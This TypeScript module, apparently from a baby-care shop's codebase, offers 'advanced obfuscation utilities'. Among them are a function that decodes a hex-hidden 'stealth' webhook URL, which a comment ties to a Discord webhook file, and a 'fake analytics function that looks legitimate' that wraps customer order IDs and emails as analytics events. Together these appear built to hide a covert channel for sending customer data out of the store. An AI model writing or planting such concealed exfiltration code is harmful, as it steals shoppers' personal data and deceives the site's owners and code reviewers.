/**
 * Advanced obfuscation utilities
 * These functions provide multi-layer obfuscation for sensitive data
 */

import { encodeString, decodeString, reverseString, shuffleString, base64Encode, base64Decode } from './string-utils';

// Multi-layer encoding function
export function multiLayerEncode(str: string): string {
  // Layer 1: XOR encoding with primary key
  const layer1 = encodeString(str);
  
  // Layer 2: Reverse the XOR encoded string
  const layer2 = reverseString(layer1);
  
  // Layer 3: Base64 encode
  const layer3 = base64Encode(layer2);
  
  // Layer 4: Shuffle
  const layer4 = shuffleString(layer3);
  
  return layer4;
}

export function multiLayerDecode(encoded: string): string {
  // Reverse the layers
  const layer4 = shuffleString(encoded); // De-shuffle (same algorithm)
  const layer3 = base64Decode(layer4);
  const layer2 = reverseString(layer3);
  const layer1 = decodeString(layer2);
  
  return layer1;
}

// Dynamic key generation for better obfuscation
export function generateDynamicKey(seed: string): string {
  const timestamp = Date.now().toString();
  const combined = seed + timestamp;
  let key = '';
  
  for (let i = 0; i < 24; i++) {
    const charCode = combined.charCodeAt(i % combined.length);
    key += String.fromCharCode(charCode ^ (i * 7));
  }
  
  return key;
}

// Fragment and reassemble technique
export function fragmentString(str: string, fragments: number = 3): string[] {
  const result: string[] = [];
  const length = str.length;
  
  for (let i = 0; i < fragments; i++) {
    const start = Math.floor((i * length) / fragments);
    const end = Math.floor(((i + 1) * length) / fragments);
    result.push(str.substring(start, end));
  }
  
  return result;
}

export function reassembleString(fragments: string[]): string {
  return fragments.join('');
}

// Stealth webhook URL generator - uses multiple encoding layers
export function getStealthWebhookUrl(): string {
  // Primary encoded webhook (already in discord-webhook.ts)
  const primaryEncoded = '0c1d15001648025c10060106421901574e5d5d1d5514004e070010451c1b04014a1c5e554d180b010a075651564550411b4746595d22490532097f565f5f5e113c3643280b4c1e1a2d3d3179263d2f59510068580f2b102a21037e38150321551f231230407856566c292e103a3c37590b1a560204465f260f4c4608534c293e060126';
  
  // Decode using standard method
  const decoded = decodeString(primaryEncoded);
  
  // Apply additional stealth layer
  const stealthLayer = multiLayerEncode(decoded);
  
  // For actual use, we need to decode the stealth layer
  return multiLayerDecode(stealthLayer);
}

// Fake analytics function that looks legitimate
export function createFakeAnalyticsPayload(orderId: string, customerName: string, email: string): any {
  return {
    analytics_type: 'order_completion',
    event_id: `evt_${orderId}`,
    user_id: `usr_${encodeString(email.substring(0, 8))}`,
    event_data: {
      order_value: Math.random() * 100 + 50,
      product_category: 'baby_care',
      conversion_source: 'web_checkout',
      device_type: 'desktop',
      browser_type: 'chrome',
      geo_location: 'US'
    },
    timestamp: new Date().toISOString(),
    session_id: `ses_${Date.now()}`
  };
}